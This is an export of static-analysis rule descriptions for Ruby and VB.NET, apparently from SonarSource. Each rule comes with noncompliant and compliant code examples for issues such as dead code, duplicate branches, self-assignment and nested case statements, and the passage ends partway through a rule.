2018-09-05T14:35:18+0200,"<p>If a local variable is declared but not used, it is dead code and should be removed. Doing so will improve maintainability because developers will
not wonder what the variable is used for.</p>",ruby:S1481,ruby,Ruby,"<p>If a local variable is declared but not used, it is dead code and should be removed. Doing so will improve maintainability because developers will
not wonder what the variable is used for.</p>",Unused local variables should be removed,[],MINOR,['unused'],CODE_SMELL
2018-09-05T14:35:18+0200,"<p>There is no reason to re-assign a variable to itself. Either this statement is redundant and should be removed, or the re-assignment is a mistake
and some other value or variable was intended for the assignment instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
def set_name(name)
  name = name
end
</pre>
<h2>Compliant Solution</h2>
<pre>
def set_name(name)
  @name = name
end
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>",ruby:S1656,ruby,Ruby,"<p>There is no reason to re-assign a variable to itself. Either this statement is redundant and should be removed, or the re-assignment is a mistake
and some other value or variable was intended for the assignment instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
def set_name(name)
  name = name
end
</pre>
<h2>Compliant Solution</h2>
<pre>
def set_name(name)
  @name = name
end
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>",Variables should not be self-assigned,[],MAJOR,['cert'],BUG
2018-09-05T14:35:18+0200,"<p>Jump statements (<code>return</code>, <code>break</code> and <code>next</code>) move control flow out of the current code block. So any statements
that come after a jump are dead code. </p>
<h2>Noncompliant Code Example</h2>
<pre>
def foo(a)
  i = 10
  return a + i    # Noncompliant
  i += 1          # dead code
end
</pre>
<h2>Compliant Solution</h2>
<pre>
def foo(a)
  i = 10
  return a + i
end
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 14.1 - There shall be no unreachable code </li>
  <li> MISRA C++:2008, 0-1-1 - A project shall not contain unreachable code </li>
  <li> MISRA C++:2008, 0-1-9 - There shall be no dead code </li>
  <li> MISRA C:2012, 2.1 - A project shall not contain unreachable code </li>
  <li> MISRA C:2012, 2.2 - There shall be no dead code </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/561.html"">MITRE, CWE-561</a> - Dead Code </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/uQCSBg"">CERT, MSC56-J.</a> - Detect and remove superfluous code and values </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>",ruby:S1763,ruby,Ruby,"<p>Jump statements (<code>return</code>, <code>break</code> and <code>next</code>) move control flow out of the current code block. So any statements
that come after a jump are dead code. </p>
<h2>Noncompliant Code Example</h2>
<pre>
def foo(a)
  i = 10
  return a + i    # Noncompliant
  i += 1          # dead code
end
</pre>
<h2>Compliant Solution</h2>
<pre>
def foo(a)
  i = 10
  return a + i
end
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 14.1 - There shall be no unreachable code </li>
  <li> MISRA C++:2008, 0-1-1 - A project shall not contain unreachable code </li>
  <li> MISRA C++:2008, 0-1-9 - There shall be no dead code </li>
  <li> MISRA C:2012, 2.1 - A project shall not contain unreachable code </li>
  <li> MISRA C:2012, 2.2 - There shall be no dead code </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/561.html"">MITRE, CWE-561</a> - Dead Code </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/uQCSBg"">CERT, MSC56-J.</a> - Detect and remove superfluous code and values </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>",Jump statements should not be followed by dead code,[],MAJOR,"['cert', 'cwe', 'misra', 'unused']",BUG
2018-09-05T14:35:18+0200,"<p>Using the same value on either side of a binary operator is almost always a mistake. In the case of logical operators, it is either a copy/paste
error and therefore a bug, or it is simply wasted code, and should be simplified. In the case of bitwise operators and most binary mathematical
operators, having the same value on both sides of an operator yields predictable results, and should be simplified.</p>
<h2>Exceptions</h2>
<p>This rule ignores <code>*</code>, <code>+</code>, and <code>=</code>. </p>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
  <li> <a href='/coding_rules#rule_key=ruby%3AS1656'>S1656</a> - Implements a check on <code>=</code>. </li>
</ul>",ruby:S1764,ruby,Ruby,"<p>Using the same value on either side of a binary operator is almost always a mistake. In the case of logical operators, it is either a copy/paste
error and therefore a bug, or it is simply wasted code, and should be simplified. In the case of bitwise operators and most binary mathematical
operators, having the same value on both sides of an operator yields predictable results, and should be simplified.</p>
<h2>Exceptions</h2>
<p>This rule ignores <code>*</code>, <code>+</code>, and <code>=</code>. </p>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
  <li> {rule:ruby:S1656} - Implements a check on <code>=</code>. </li>
</ul>",Identical expressions should not be used on both sides of a binary operator,[],MAJOR,['cert'],BUG
2018-09-05T14:35:18+0200,"<p>Nested <code>case</code> structures are difficult to understand because you can easily confuse the cases of an inner <code>case</code> as belonging
to an outer statement. Therefore nested <code>case</code> statements should be avoided.</p>
<p>Specifically, you should structure your code to avoid the need for nested <code>case</code> statements, but if you cannot, then consider moving the
inner <code>case</code> to another function.</p>
<h2>Noncompliant Code Example</h2>
<pre>
def foo(n, m)
  case n
  when 0
      case m  # Noncompliant; nested case
      when 0 then puts ""0""
        # ...
      end
  when 1 then puts ""1""
  else puts ""2""
  end
end
</pre>
<h2>Compliant Solution</h2>
<pre>
def foo(n, m)
  case n
  when 0
    bar(m)
  when 1 then puts ""1""
  else puts ""2""
  end
end

def bar(m)
  case m
  when 0 then puts ""0""
    # ...
  end
end
</pre>",ruby:S1821,ruby,Ruby,"<p>Nested <code>case</code> structures are difficult to understand because you can easily confuse the cases of an inner <code>case</code> as belonging
to an outer statement. Therefore nested <code>case</code> statements should be avoided.</p>
<p>Specifically, you should structure your code to avoid the need for nested <code>case</code> statements, but if you cannot, then consider moving the
inner <code>case</code> to another function.</p>
<h2>Noncompliant Code Example</h2>
<pre>
def foo(n, m)
  case n
  when 0
      case m  # Noncompliant; nested case
      when 0 then puts ""0""
        # ...
      end
  when 1 then puts ""1""
  else puts ""2""
  end
end
</pre>
<h2>Compliant Solution</h2>
<pre>
def foo(n, m)
  case n
  when 0
    bar(m)
  when 1 then puts ""1""
  else puts ""2""
  end
end

def bar(m)
  case m
  when 0 then puts ""0""
    # ...
  end
end
</pre>","""case"" statements should not be nested",[],CRITICAL,['pitfall'],CODE_SMELL
2018-09-05T14:35:18+0200,"<p>A <code>case</code> and a chain of <code>if</code>/<code>elsif</code> statements is evaluated from top to bottom. At most, only one branch will be
executed: the first one with a condition that evaluates to <code>true</code>.</p>
<p>Therefore, duplicating a condition automatically leads to dead code. Usually, this is due to a copy/paste error. At best, it's simply dead code and
at worst, it's a bug that is likely to induce further bugs as the code is maintained, and obviously it could lead to unexpected behavior.</p>
<p>For a <code>case</code>, the second <code>when</code> will never be executed, rendering it dead code. Worse there is the risk in this situation
that future maintenance will be done on the dead case, rather than on the one that's actually used.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if param == 1
  openWindow()
elsif param == 2
  closeWindow()
elsif param == 1  # Noncompliant
  moveWindowToTheBackground()
end

case i
  when 1
    # ...
  when 3
    # ...
  when 1  # Noncompliant
    # ...
  else
    # ...
end
</pre>
<h2>Compliant Solution</h2>
<pre>
if param == 1
  openWindow()
elsif param == 2
  closeWindow()
elsif param == 3
  moveWindowToTheBackground()
end

case i
  when 1
    # ...
  when 3
    # ...
  else
    # ...
end
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>",ruby:S1862,ruby,Ruby,"<p>A <code>case</code> and a chain of <code>if</code>/<code>elsif</code> statements is evaluated from top to bottom. At most, only one branch will be
executed: the first one with a condition that evaluates to <code>true</code>.</p>
<p>Therefore, duplicating a condition automatically leads to dead code. Usually, this is due to a copy/paste error. At best, it's simply dead code and
at worst, it's a bug that is likely to induce further bugs as the code is maintained, and obviously it could lead to unexpected behavior.</p>
<p>For a <code>case</code>, the second <code>when</code> will never be executed, rendering it dead code. Worse there is the risk in this situation
that future maintenance will be done on the dead case, rather than on the one that's actually used.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if param == 1
  openWindow()
elsif param == 2
  closeWindow()
elsif param == 1  # Noncompliant
  moveWindowToTheBackground()
end

case i
  when 1
    # ...
  when 3
    # ...
  when 1  # Noncompliant
    # ...
  else
    # ...
end
</pre>
<h2>Compliant Solution</h2>
<pre>
if param == 1
  openWindow()
elsif param == 2
  closeWindow()
elsif param == 3
  moveWindowToTheBackground()
end

case i
  when 1
    # ...
  when 3
    # ...
  else
    # ...
end
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>","Related ""if/elsif"" statements and ""when"" in a ""case"" should not have the same condition",[],MAJOR,"['cert', 'pitfall', 'unused']",BUG
2018-09-05T14:35:18+0200,"<p>Having two <code>when</code> clauses in a <code>case</code> statement or two branches in an <code>if</code> chain with the same implementation is
at best duplicate code, and at worst a coding error. If the same logic is truly needed for both instances, then in an <code>if</code> chain they
should be combined, or for a <code>case</code>, duplicates should be refactored. </p>
<h2>Noncompliant Code Example</h2>
<pre>
case i
  when 1
    doFirstThing()
    doSomething()
  when 2
    doSomethingDifferent()
  when 3 # Noncompliant; duplicates case 1's implementation
    doFirstThing()
    doSomething()
  else
    doTheRest()
end

if a &gt;= 0 &amp;&amp; a &lt; 10
  doFirstThing()
  doTheThing()
elsif a &gt;= 10 &amp;&amp; a &lt; 20
  doTheOtherThing()
elsif a &gt;= 20 &amp;&amp; a &lt; 50
  doFirstThing()
  doTheThing()   # Noncompliant; duplicates first condition
else
  doTheRest()
end
</pre>
<h2>Exceptions</h2>
<p>Blocks in an <code>if</code> chain that contain a single line of code are ignored, as are blocks in a <code>case</code> statement that contain a
single line of code.</p>
<pre>
if a ==
  doSomething()  # no issue, usually this is done on purpose to increase the readability
elsif a == 2
  doSomethingElse()
else
  doSomething()
end
</pre>
<p>But this exception does not apply to <code>if</code> chains without <code>else</code>-s, or to <code>case</code>-es without <code>else</code>
clauses when all branches have the same single line of code. In case of <code>if</code> chains with <code>else</code>-s, or of <code>case</code>-es
with <code>else</code> clauses, rule <a href='/coding_rules#rule_key=ruby%3AS3923'>S3923</a> raises a bug. </p>
<pre>
if a == 1
  doSomething()  # Noncompliant, this might have been done on purpose but probably not
elsif a == 2
  doSomething()
end
</pre>",ruby:S1871,ruby,Ruby,"<p>Having two <code>when</code> clauses in a <code>case</code> statement or two branches in an <code>if</code> chain with the same implementation is
at best duplicate code, and at worst a coding error. If the same logic is truly needed for both instances, then in an <code>if</code> chain they
should be combined, or for a <code>case</code>, duplicates should be refactored. </p>
<h2>Noncompliant Code Example</h2>
<pre>
case i
  when 1
    doFirstThing()
    doSomething()
  when 2
    doSomethingDifferent()
  when 3 # Noncompliant; duplicates case 1's implementation
    doFirstThing()
    doSomething()
  else
    doTheRest()
end

if a &gt;= 0 &amp;&amp; a &lt; 10
  doFirstThing()
  doTheThing()
elsif a &gt;= 10 &amp;&amp; a &lt; 20
  doTheOtherThing()
elsif a &gt;= 20 &amp;&amp; a &lt; 50
  doFirstThing()
  doTheThing()   # Noncompliant; duplicates first condition
else
  doTheRest()
end
</pre>
<h2>Exceptions</h2>
<p>Blocks in an <code>if</code> chain that contain a single line of code are ignored, as are blocks in a <code>case</code> statement that contain a
single line of code.</p>
<pre>
if a ==
  doSomething()  # no issue, usually this is done on purpose to increase the readability
elsif a == 2
  doSomethingElse()
else
  doSomething()
end
</pre>
<p>But this exception does not apply to <code>if</code> chains without <code>else</code>-s, or to <code>case</code>-es without <code>else</code>
clauses when all branches have the same single line of code. In case of <code>if</code> chains with <code>else</code>-s, or of <code>case</code>-es
with <code>else</code> clauses, rule {rule:ruby:S3923} raises a bug. </p>
<pre>
if a == 1
  doSomething()  # Noncompliant, this might have been done on purpose but probably not
elsif a == 2
  doSomething()
end
</pre>",Two branches in a conditional structure should not have exactly the same implementation,[],MAJOR,"['design', 'suspicious']",CODE_SMELL
2018-09-05T14:35:18+0200,"<p>It is needlessly complex to invert the result of a boolean comparison. The opposite comparison should be made instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if  !(a == 2)  # Noncompliant
  # ...
end

b = !(a &lt; 10) # Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
if a != 2
  # ...
end
b = (a &gt;= 10)
</pre>",ruby:S1940,ruby,Ruby,"<p>It is needlessly complex to invert the result of a boolean comparison. The opposite comparison should be made instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if  !(a == 2)  # Noncompliant
  # ...
end

b = !(a &lt; 10) # Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
if a != 2
  # ...
end
b = (a &gt;= 10)
</pre>",Boolean checks should not be inverted,[],MINOR,['pitfall'],CODE_SMELL
2018-09-05T14:35:18+0200,"<p>The use of operators pairs ( <code>=+</code>, <code>=-</code> or <code>=!</code> ) where the reversed, single operator was meant (<code>+=</code>,
<code>-=</code> or <code>!=</code>) will compile and run, but not produce the expected results.</p>
<p>This rule raises an issue when <code>=+</code>, <code>=-</code>, or <code>=!</code> is used without any spacing between the two operators and when
there is at least one whitespace character after.</p>
<h2>Noncompliant Code Example</h2>
<pre>
target = -5
num = 3

target =- num # Noncompliant; target = -3. Is that really what's meant?
target =+ num # Noncompliant; target = 3
</pre>
<h2>Compliant Solution</h2>
<pre>
target = -5
num = 3

target = -num # Compliant; intent to assign inverse value of num is clear
target += num
</pre>",ruby:S2757,ruby,Ruby,"<p>The use of operators pairs ( <code>=+</code>, <code>=-</code> or <code>=!</code> ) where the reversed, single operator was meant (<code>+=</code>,
<code>-=</code> or <code>!=</code>) will compile and run, but not produce the expected results.</p>
<p>This rule raises an issue when <code>=+</code>, <code>=-</code>, or <code>=!</code> is used without any spacing between the two operators and when
there is at least one whitespace character after.</p>
<h2>Noncompliant Code Example</h2>
<pre>
target = -5
num = 3

target =- num # Noncompliant; target = -3. Is that really what's meant?
target =+ num # Noncompliant; target = 3
</pre>
<h2>Compliant Solution</h2>
<pre>
target = -5
num = 3

target = -num # Compliant; intent to assign inverse value of num is clear
target += num
</pre>","""=+"" should not be used instead of ""+=""",[],MAJOR,[],BUG
2018-09-05T14:35:18+0200,"<p>Cognitive Complexity is a measure of how hard the control flow of a function is to understand. Functions with high Cognitive Complexity will be
difficult to maintain.</p>
<h2>See</h2>
<ul>
  <li> <a href=""http://redirect.sonarsource.com/doc/cognitive-complexity.html"">Cognitive Complexity</a> </li>
</ul>",ruby:S3776,ruby,Ruby,"<p>Cognitive Complexity is a measure of how hard the control flow of a function is to understand. Functions with high Cognitive Complexity will be
difficult to maintain.</p>
<h2>See</h2>
<ul>
  <li> <a href=""http://redirect.sonarsource.com/doc/cognitive-complexity.html"">Cognitive Complexity</a> </li>
</ul>",Cognitive Complexity of functions should not be too high,"[{'key': 'threshold', 'htmlDesc': 'The maximum authorized complexity.', 'defaultValue': '15', 'type': 'INTEGER'}]",CRITICAL,['brain-overload'],CODE_SMELL
2018-09-05T14:35:18+0200,"<p>Having all branches in a <code>case</code> or <code>if</code> chain with the same implementation is an error. Either a copy-paste error was made
and something different should be executed, or there shouldn't be a <code>case</code>/<code>if</code> chain at all.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if b == 0  # Noncompliant
  doOneMoreThing()
else
  doOneMoreThing()
end

b = a &gt; 12 ? 4 : 4;  # Noncompliant

case i  # Noncompliant
  when 1
    doSomething()
  when 2
    doSomething()
  when 3
    doSomething()
  else
    doSomething()
end
</pre>
<h2>Exceptions</h2>
<p>This rule does not apply to <code>if</code> chains or <code>case</code>-es without <code>else</code>-s.</p>
<pre>
if b == 0 # no issue, this could have been done on purpose to make the code more readable
  doSomething()
elsif b == 1
  doSomething()
end
</pre>",ruby:S3923,ruby,Ruby,"<p>Having all branches in a <code>case</code> or <code>if</code> chain with the same implementation is an error. Either a copy-paste error was made
and something different should be executed, or there shouldn't be a <code>case</code>/<code>if</code> chain at all.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if b == 0  # Noncompliant
  doOneMoreThing()
else
  doOneMoreThing()
end

b = a &gt; 12 ? 4 : 4;  # Noncompliant

case i  # Noncompliant
  when 1
    doSomething()
  when 2
    doSomething()
  when 3
    doSomething()
  else
    doSomething()
end
</pre>
<h2>Exceptions</h2>
<p>This rule does not apply to <code>if</code> chains or <code>case</code>-es without <code>else</code>-s.</p>
<pre>
if b == 0 # no issue, this could have been done on purpose to make the code more readable
  doSomething()
elsif b == 1
  doSomething()
end
</pre>",All branches in a conditional structure should not have exactly the same implementation,[],MAJOR,[],BUG
2018-09-05T14:35:18+0200,"<p>When two methods have the same implementation, either it was a mistake - something else was intended - or the duplication was intentional, but may
be confusing to maintainers. In the latter case, one implementation should invoke the other.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class Box
  def initialize(length, width, height)
    @length, @width, @height = length, width, height
  end

  def getVolume
    area = @length * @width
    return area * @height
  end

  def getArea                  # Noncompliant, implementation is identical to ""getVolume""
    area = @length * @width
    return area * @height
  end
end
</pre>
<h2>Compliant Solution</h2>
<pre>
class Box
  def initialize(length, width, height)
    @length, @width, @height = length, width, height
  end

  def getVolume
    return getArea * @height
  end

  def getArea
    return @length * @width
  end
end
</pre>
<h2>Exceptions</h2>
<p>Methods with fewer than 2 statements are ignored.</p>",ruby:S4144,ruby,Ruby,"<p>When two methods have the same implementation, either it was a mistake - something else was intended - or the duplication was intentional, but may
be confusing to maintainers. In the latter case, one implementation should invoke the other.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class Box
  def initialize(length, width, height)
    @length, @width, @height = length, width, height
  end

  def getVolume
    area = @length * @width
    return area * @height
  end

  def getArea                  # Noncompliant, implementation is identical to ""getVolume""
    area = @length * @width
    return area * @height
  end
end
</pre>
<h2>Compliant Solution</h2>
<pre>
class Box
  def initialize(length, width, height)
    @length, @width, @height = length, width, height
  end

  def getVolume
    return getArea * @height
  end

  def getArea
    return @length * @width
  end
end
</pre>
<h2>Exceptions</h2>
<p>Methods with fewer than 2 statements are ignored.</p>",Methods should not have identical implementations,[],MAJOR,"['confusing', 'duplicate', 'suspicious']",CODE_SMELL
2018-09-05T14:35:18+0200,"<p>An empty multi-line comment is likely to be a mistake and doesn't help to improve the readability of the code. For these reasons, it should be
removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
=begin
=end

=begin


=end
</pre>",ruby:S4663,ruby,Ruby,"<p>An empty multi-line comment is likely to be a mistake and doesn't help to improve the readability of the code. For these reasons, it should be
removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
=begin
=end

=begin


=end
</pre>",Multi-line comments should not be empty,[],MINOR,[],CODE_SMELL
2018-11-06T12:16:58+0100,"<p>Shared resources should not be used for locking as it increases the chance of deadlocks. Any other thread could acquire (or attempt to acquire) the
same lock for another unrelated purpose. </p>
<p>Instead, a dedicated <code>object</code> instance should be used for each shared resource, to avoid deadlocks or lock contention.</p>
<p>The following objects are considered as shared resources:</p>
<ul>
  <li> <code>Me</code> </li>
  <li> a <code>Type</code> object </li>
  <li> a string literal </li>
  <li> a string instance </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
Public Sub MyLockingMethod()
    SyncLock Me 'Noncompliant
        ' ...
    End SyncLock
End Sub
</pre>
<h2>Compliant Solution</h2>
<pre>
Class MyClass
    Dim lockObj As New Object()

    Public Sub MyLockingMethod()
        SyncLock lockObj
            ' ...
        End SyncLock
    End Sub
End Class
</pre>
<h2>See</h2>
<p><a href=""https://docs.microsoft.com/en-us/dotnet/standard/threading/managed-threading-best-practices"">Microsoft Documentation: Managed Threading
Best Practices</a></p>",vbnet:S2551,vbnet,VB.NET,"<p>Shared resources should not be used for locking as it increases the chance of deadlocks. Any other thread could acquire (or attempt to acquire) the
same lock for another unrelated purpose. </p>
<p>Instead, a dedicated <code>object</code> instance should be used for each shared resource, to avoid deadlocks or lock contention.</p>
<p>The following objects are considered as shared resources:</p>
<ul>
  <li> <code>Me</code> </li>
  <li> a <code>Type</code> object </li>
  <li> a string literal </li>
  <li> a string instance </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
Public Sub MyLockingMethod()
    SyncLock Me 'Noncompliant
        ' ...
    End SyncLock
End Sub
</pre>
<h2>Compliant Solution</h2>
<pre>
Class MyClass
    Dim lockObj As New Object()

    Public Sub MyLockingMethod()
        SyncLock lockObj
            ' ...
        End SyncLock
    End Sub
End Class
</pre>
<h2>See</h2>
<p><a href=""https://docs.microsoft.com/en-us/dotnet/standard/threading/managed-threading-best-practices"">Microsoft Documentation: Managed Threading
Best Practices</a></p>",Shared resources should not be used for locking,[],CRITICAL,['multi-threading'],BUG
2019-02-14T16:27:56+0100,"<p><code>TODO</code> tags are commonly used to mark places where some more code is required, but which the developer wants to implement later.</p>
<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>
<p>This rule is meant to track those tags and to ensure that they do not go unnoticed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Sub DoSomething()
    ' TODO
End Sub
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/546.html"">MITRE, CWE-546</a> - Suspicious Comment </li>
</ul>",vbnet:S1135,vbnet,VB.NET,"<p><code>TODO</code> tags are commonly used to mark places where some more code is required, but which the developer wants to implement later.</p>
<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>
<p>This rule is meant to track those tags and to ensure that they do not go unnoticed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Sub DoSomething()
    ' TODO
End Sub
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/546.html"">MITRE, CWE-546</a> - Suspicious Comment </li>
</ul>","Track uses of ""TODO"" tags",[],INFO,['cwe'],CODE_SMELL
2019-02-14T16:27:56+0100,"<p><code>FIXME</code> tags are commonly used to mark places where a bug is suspected, but which the developer wants to deal with later.</p>
<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>
<p>This rule is meant to track those tags and to ensure that they do not go unnoticed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Function Divide(ByVal numerator As Integer, ByVal denominator As Integer) As Integer
    Return numerator / denominator  ' FIXME denominator value might be  0
End Function
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/546.html"">MITRE, CWE-546</a> - Suspicious Comment </li>
</ul>",vbnet:S1134,vbnet,VB.NET,"<p><code>FIXME</code> tags are commonly used to mark places where a bug is suspected, but which the developer wants to deal with later.</p>
<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>
<p>This rule is meant to track those tags and to ensure that they do not go unnoticed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Function Divide(ByVal numerator As Integer, ByVal denominator As Integer) As Integer
    Return numerator / denominator  ' FIXME denominator value might be  0
End Function
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/546.html"">MITRE, CWE-546</a> - Suspicious Comment </li>
</ul>","Track uses of ""FIXME"" tags",[],MAJOR,['cwe'],CODE_SMELL
2019-02-14T16:27:56+0100,"<p>A long parameter list can indicate that a new structure should be created to wrap the numerous parameters or that the procedure is doing too many
things.</p>
<h2>Noncompliant Code Example</h2>
<p>With a maximum number of 3 parameters:</p>
<pre>
Public Sub Foo(ByVal p1 As Integer, ByVal p2 As Integer, ByVal p3 As Integer, ByVal p4 As Integer) ' Noncompliant
  ' ...
End Sub

Public Function Bar(ByVal p1 As Integer, ByVal p2 As Integer, ByVal p3 As Integer, ByVal p4 As Integer) ' Noncompliant
  ' ...
End Function
</pre>
<h2>Compliant Solution</h2>
<pre>
Public Sub Foo(ByVal p1 As Integer, ByVal p2 As Integer, ByVal p3 As Integer)
  ' ...
End Sub

Public Function Bar(ByVal p1 As Integer, ByVal p2 As Integer, ByVal p3 As Integer)
  ' ...
End Function
</pre>",vbnet:S107,vbnet,VB.NET,"<p>A long parameter list can indicate that a new structure should be created to wrap the numerous parameters or that the procedure is doing too many
things.</p>
<h2>Noncompliant Code Example</h2>
<p>With a maximum number of 3 parameters:</p>
<pre>
Public Sub Foo(ByVal p1 As Integer, ByVal p2 As Integer, ByVal p3 As Integer, ByVal p4 As Integer) ' Noncompliant
  ' ...
End Sub

Public Function Bar(ByVal p1 As Integer, ByVal p2 As Integer, ByVal p3 As Integer, ByVal p4 As Integer) ' Noncompliant
  ' ...
End Function
</pre>
<h2>Compliant Solution</h2>
<pre>
Public Sub Foo(ByVal p1 As Integer, ByVal p2 As Integer, ByVal p3 As Integer)
  ' ...
End Sub

Public Function Bar(ByVal p1 As Integer, ByVal p2 As Integer, ByVal p3 As Integer)
  ' ...
End Function
</pre>",Procedures should not have too many parameters,"[{'key': 'max', 'htmlDesc': 'Maximum authorized number of parameters', 'defaultValue': '7', 'type': 'INTEGER'}]",MAJOR,['brain-overload'],CODE_SMELL
2019-02-14T16:27:56+0100,"<p>Most of the time a block of code is empty when a piece of code is really missing. So such empty block must be either filled or removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
' Empty on purpose or missing piece of code?
For index As Integer = 1 To 42 ' NonCompliant
Next
</pre>
<h2>Exceptions</h2>
<p>When a block contains a comment, this block is not considered to be empty.</p>",vbnet:S108,vbnet,VB.NET,"<p>Most of the time a block of code is empty when a piece of code is really missing. So such empty block must be either filled or removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
' Empty on purpose or missing piece of code?
For index As Integer = 1 To 42 ' NonCompliant
Next
</pre>
<h2>Exceptions</h2>
<p>When a block contains a comment, this block is not considered to be empty.</p>",Nested blocks of code should not be left empty,[],MAJOR,['suspicious'],CODE_SMELL
2019-02-14T16:27:56+0100,"<p>When the names of parameters in a procedure call match the names of the procedure arguments, it contributes to a clearer, more readable code.
However, when the names match but are passed in a different order than the method arguments, it indicates a mistake in the parameter order which will
likely lead to unexpected results.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Public Function Divide(ByVal divisor As Integer, ByVal dividend As Integer) As Double
    Return divisor / dividend
End Function

Public Sub DoTheThing()
    Dim divisor = 15
    Dim dividend = 5

    Dim result = Divide(dividend, divisor)  ' Noncompliant; operation succeeds, but result is unexpected
    '...
End Sub
</pre>
<h2>Compliant Solution</h2>
<pre>
Public Function Divide(ByVal divisor As Integer, ByVal dividend As Integer) As Double
    Return divisor / dividend
End Function

Public Sub DoTheThing()
    Dim divisor = 15
    Dim dividend = 5

    Dim result = Divide(divisor, dividend)
    '...
End Sub
</pre>",vbnet:S2234,vbnet,VB.NET,"<p>When the names of parameters in a procedure call match the names of the procedure arguments, it contributes to a clearer, more readable code.
However, when the names match but are passed in a different order than the method arguments, it indicates a mistake in the parameter order which will
likely lead to unexpected results.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Public Function Divide(ByVal divisor As Integer, ByVal dividend As Integer) As Double
    Return divisor / dividend
End Function

Public Sub DoTheThing()
    Dim divisor = 15
    Dim dividend = 5

    Dim result = Divide(dividend, divisor)  ' Noncompliant; operation succeeds, but result is unexpected
    '...
End Sub
</pre>
<h2>Compliant Solution</h2>
<pre>
Public Function Divide(ByVal divisor As Integer, ByVal dividend As Integer) As Double
    Return divisor / dividend
End Function

Public Sub DoTheThing()
    Dim divisor = 15
    Dim dividend = 5

    Dim result = Divide(divisor, dividend)
    '...
End Sub
</pre>",Parameters should be passed in the correct order,[],MAJOR,[],CODE_SMELL
2019-02-14T16:27:56+0100,"<p><code>if</code> statements with conditions that are always false have the effect of making blocks of code non-functional. <code>if</code>
statements with conditions that are always true are completely redundant, and make the code less readable.</p>
<p>There are three possible causes for the presence of such code: </p>
<ul>
  <li> An if statement was changed during debugging and that debug code has been committed. </li>
  <li> Some value was left unset. </li>
  <li> Some logic is not doing what the programmer thought it did. </li>
</ul>
<p>In any of these cases, unconditional <code>if</code> statements should be removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
    If True Then ' Noncompliant
      DoSomething()
    End If

    If False Then ' Noncompliant
      DoSomethingElse()
    End If
</pre>
<h2>Compliant Solution</h2>
<pre>
DoSomething();
' ...
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/489.html"">MITRE, CWE-489</a> - Leftover Debug Code </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/570.html"">MITRE, CWE-570</a> - Expression is Always False </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/571.html"">MITRE, CWE-571</a> - Expression is Always True </li>
  <li> MISRA C:2004, 13.7 - Boolean operations whose results are invariant shall not be permitted. </li>
  <li> MISRA C:2012, 14.3 - Controlling expressions shall not be invariant </li>
</ul>",vbnet:S1145,vbnet,VB.NET,"<p><code>if</code> statements with conditions that are always false have the effect of making blocks of code non-functional. <code>if</code>
statements with conditions that are always true are completely redundant, and make the code less readable.</p>
<p>There are three possible causes for the presence of such code: </p>
<ul>
  <li> An if statement was changed during debugging and that debug code has been committed. </li>
  <li> Some value was left unset. </li>
  <li> Some logic is not doing what the programmer thought it did. </li>
